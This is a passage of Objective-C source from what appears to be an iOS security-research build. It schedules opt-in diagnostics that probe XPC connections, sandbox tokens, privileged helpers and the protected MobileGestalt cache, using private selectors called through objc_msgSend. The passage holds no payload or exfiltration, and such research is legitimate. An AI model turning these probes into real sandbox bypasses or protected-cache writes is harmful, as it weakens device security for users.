            BQLog(@"RO23 V7 END noSystemWrites=YES");
            ((void (*)(id, SEL))objc_msgSend)(
                connection,
                NSSelectorFromString(@"invalidate")
            );
        }
    );
}

// RO23: RO23V7Start automatic startup removed (explicit opt-in only).


// ===== END RO23_V7_XPC_COMPARE =====

// RO23 PUBLIC RESEARCH BUILD: runs in response to an explicit UI button.
// These tests may write logs/backups inside the app sandbox but do NOT request
// writes to the protected system MobileGestalt cache. V4 consumes a sandbox
// token only to compare permissions and releases it afterward.
void BQRunRO23Diagnostics(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        BQLog(@"RO23 OPT-IN: begin V1-V7 research diagnostics");
        dispatch_queue_t queue = dispatch_get_global_queue(QOS_CLASS_UTILITY, 0);
        dispatch_async(queue, ^{ RO23ARun(); });
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), queue, ^{ RO23TypeCheck(); });
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)), queue, ^{ RO23SandboxRun(); });
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(6 * NSEC_PER_SEC)), queue, ^{ RO23HelperProbe(); });
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), queue, ^{ RO23V6Run(); });
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(24 * NSEC_PER_SEC)), queue, ^{ RO23V7Run(); });
    });
}
